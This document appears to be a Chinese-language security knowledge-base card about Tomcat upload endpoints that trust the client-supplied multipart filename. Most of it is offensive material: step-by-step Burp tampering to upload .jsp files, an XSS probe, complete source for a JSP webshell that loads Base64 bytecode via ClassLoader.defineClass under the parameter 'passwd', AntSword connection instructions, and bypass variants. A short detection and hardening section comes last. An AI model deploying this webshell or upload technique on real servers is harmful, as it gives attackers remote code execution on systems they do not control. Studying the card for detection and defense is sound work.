---
id: web-generic-file-upload-multipart-filename-jsp-tomcat-webshell
title: 上传点信任 multipart filename：改后缀为 .jsp 落 Web 目录被 Tomcat 解析 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: multipart-filename-jsp-trust-server-side-execution
tags:
- web
- file-upload
- jsp
- tomcat
- webshell
- antsword
- classloader
- rce
- java
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V285
  verified_at: '2026-11-08T05:08:46+08:00'
  notes: 已对照原文与18张图核对：图14 头像上传正常图片、图15 改 filename=xiaoma.html/Content-Type text.html 上传 test、图16 filename=test.html + alert(1) 浏览器弹窗、图17 filename=xiaoma.jsp/Content-Type text/html + <h1>test</h1> 上传后页面渲染 test 且响应含 fileName=xiaoma.jsp 与存储路径、图18 蚁剑 JSP 连接 success（密码 passwd）。卡片与原文一致，并如实注明 <h1>test</h1> 本身不能证明 JSP 编译，需木马连接验证；ClassLoader.defineClass+Base64+equals(pageContext) 木马结构逐字对应原文。原子性：单一「信任 multipart filename→.jsp 落 Web 目录→Tomcat 解析」场景，未过粗；HTML 上传 XSS 已由既有卡覆盖故未并卡。dedup 除自索引外 top 为相关卡（Tomcat web.xml 覆盖、Spring temppath 穿越、original filename 等）均为 related，dup-scan 无本卡 pair。原文未标版本，未设置 versions；未执行上传/蚁剑连接。
url: /docs/web/generic/file-upload/web-generic-file-upload-multipart-filename-jsp-tomcat-webshell/
draft: false
kb_aliases:
- 上传 jsp getshell
- filename 改 jsp
- multipart filename 信任
- 头像上传 getshell
- Tomcat JSP 上传
- 蚁剑 JSP 马
- ClassLoader defineClass JSP
- Content-Type text/html 上传
---

## 一句话结论

上传点如果只做前端校验或完全不校验，而服务端直接信任 multipart 中的 `filename` 并把文件写进 Web 根目录，攻击者把 `filename` 改成 `xiaoma.jsp`（`Content-Type` 可随意设为 `text/html` 或 `image/jpeg`）即可让 Tomcat 按 `.jsp` 映射编译执行；随后上传一个从请求参数取 Base64 字节码、用 `ClassLoader.defineClass` 加载并 `newInstance().equals(pageContext)` 触发的 JSP 木马，用蚁剑连接即可 getshell。

## 原理

- **服务端信任客户端文件名**：multipart 请求里的 `filename` 和 `Content-Type` 都由客户端控制。若服务端只做“前端 JS 校验”、或只检查 `Content-Type` 属于图片、或虽检查扩展名但直接用用户文件名落盘，攻击者就能把后缀改成 `.jsp`。
- **Tomcat 按 URL/扩展名映射**：JSP 是否执行取决于请求路径是否匹配 `*.jsp` 的 JspServlet 映射，而不是上传时的 `Content-Type`。因此把 `Content-Type` 写成 `text/html`/`image/jpeg` 不影响 `.jsp` 被编译执行；反过来，只有后缀是 `.jsp` 且落在 Web 应用可访问目录内才会执行。
- **落盘目录决定可达性**：头像/附件上传目录通常在 Web 根或静态映射下（如 `/upload/`、`/userfile/`），文件写入后可被匿名或登录用户访问；Tomcat 对该目录的 `.jsp` 若未禁止脚本执行，就会编译执行。
- **JSP 木马的类加载结构**：木马用自定义 `ClassLoader` 子类 `U` 的 `g(byte[] b)` 调用 `super.defineClass(b,0,b.length)`，把请求参数 `passwd` 里的 Base64 字节码定义成类；`newInstance()` 后调用 `equals(pageContext)` 触发载荷逻辑。字节码不落盘，JSP 本体只是加载器，便于绕过文件查杀与后续替换 payload。
- **为什么先传 HTML 有用**：同一上传点先传 `.html` 并写入 `<script>alert(1)</script>`，可验证“后缀未过滤 + 目录可访问 + 浏览器按 HTML 解析”；再传 `.jsp` 验证脚本解析，最后换木马，形成从 XSS 到 RCE 的递进验证。
- **前提与限制**：需要有效的上传会话（多数头像上传要求登录）；上传目录必须在 Web 应用内且未被配置为禁止执行 JSP；若服务端做了扩展名白名单、随机重命名并去掉后缀、或把上传目录放到 Web 根外，利用不成立。

## 触发条件

- 存在可上传文件的功能（头像、附件、简历等），且攻击者拥有有效会话/上传权限。
- 服务端未做严格扩展名白名单，或只校验前端 JS/`Content-Type`/图片头；按客户端 `filename` 落盘。
- 上传目录位于 Web 应用可访问路径，Tomcat 对 `.jsp` 正常解析且未禁用脚本执行。
- 目标为 Java/Tomcat（或其他解析 JSP 的容器）；上传接口未被 WAF 拦截 `.jsp` 文件名或 JSP 内容。

## 利用步骤

1. 先上传一张正常图片，确认上传成功并记录返回的文件 URL/目录规律。
2. 用 Burp 改包，把 `filename` 改为 `test.html`、`Content-Type` 改为 `text/html`，内容写 `<script>alert(1)</script>`；上传后访问该 URL，确认 HTML 被同源解析（存储型 XSS）。
3. 把 `filename` 改为 `xiaoma.jsp`、`Content-Type` 保持 `text/html` 或改成 `image/jpeg`，内容先写 `<h1>test</h1>`；上传后访问，确认服务器返回/渲染该 JSP（注意：`<h1>test</h1>` 本身不能证明 JSP 编译，需结合后续木马连接或 JSP 表达式验证）。
4. 上传实际 JSP 木马（见 PoC），记录访问 URL。
5. 用蚁剑添加 JSP 类型连接，URL 填木马地址，密码填木马中读取的参数名（示例 `passwd`），测试连接成功后在虚拟终端执行命令。
6. 如需更隐蔽，可改用内存马/类加载马（见关联卡），删除 JSP 后仍保留访问入口。

## PoC

改包关键字段（原文验证）：

```text
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="xiaoma.jsp"
Content-Type: text/html

<h1>test</h1>
------WebKitFormBoundary--
```

最小 JSP 类加载木马（结构与原文一致，密码参数 `passwd`）：

```jsp
<%!
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}
public byte[] base64Decode(String str) throws Exception {
    try {
        Class clazz = Class.forName("sun.misc.BASE64Decoder");
        return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                .invoke(clazz.newInstance(), str);
    } catch (Exception e) {
        Class clazz = Class.forName("java.util.Base64");
        Object decoder = clazz.getMethod("getDecoder").invoke(null);
        return (byte[]) decoder.getClass().getMethod("decode", String.class)
                .invoke(decoder, str);
    }
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
    new U(this.getClass().getClassLoader()).g(base64Decode(cls))
        .newInstance().equals(pageContext);
}
%>
```

蚁剑连接：类型 JSP，URL 为上传后的 `.jsp` 地址，连接密码 `passwd`。

## 变体与关联

- **校验绕过变体**：前端 JS 白名单（抓包改 filename）、只校验 `Content-Type`（改 `text/html` 为 `image/jpeg`）、后缀黑名单漏项/大小写/末尾空格/点、双扩展名、`.jspx`/`.jspf` 等映射。
- **JSP 木马变体**：`ClassLoader.defineClass` + Base64（本卡）、`sun.misc.Unsafe.defineAnonymousClass`、GZIP+Base64、冰蝎/哥斯拉加密马、内存 Servlet/Filter 马。
- **关联**：[[web-generic-file-upload-clientside-js-whitelist-bypass]]（前端校验绕过的通用原理）、[[web-generic-file-upload-extension-blacklist-trailing-space]]（后缀尾部空格绕过）、[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]（Unsafe 匿名类 JSP 马）、[[web-java-classloader-gzip-base64-dnslog-jsp-webshell]]（GZIP+Base64+defineClass 马）、[[web-java-classloader-jsp-memory-servlet-webshell]]（JSP 加载内存 Servlet）。
- **边界**：服务端白名单只允许图片且校验真实文件头、上传目录禁止 JSP 解析、文件被随机重命名且无后缀、WAF 拦截 JSP 内容/文件名时失效；`Content-Type` 不是安全边界，真正的边界是服务端扩展名与落盘位置。

## 检测与防御

- **上传校验**：服务端做扩展名白名单 + 真实文件头/内容检测；随机重命名并去掉用户可控后缀；把上传目录放在 Web 根外，或配置禁止脚本执行。
- **容器加固**：上传目录禁用 JSP 解析（Tomcat 可通过安全约束/独立 Context 配置）；关闭不必要的 JSP 映射；使用最小权限运行 Web 进程。
- **检测**：上传目录出现 `.jsp`/`.jspx` 文件或含 `defineClass`、`base64Decode`、`getParameter` 的文件；响应中返回用户可控 `.jsp` 文件名/路径；访问日志中对新上传 JSP 的请求；蚁剑/冰蝎特征流量。
- **防御**：WAF 对 multipart filename 与文件内容做 JSP 特征检测；对上传接口做鉴权与频率限制；启用 RASP/文件完整性监控；定期扫描 Web 目录中的异常脚本。
- **响应**：删除恶意 JSP、隔离主机、排查同目录其他上传文件与 Web 日志中的连接记录；若使用内存马，需重启应用或使用专门工具清除。
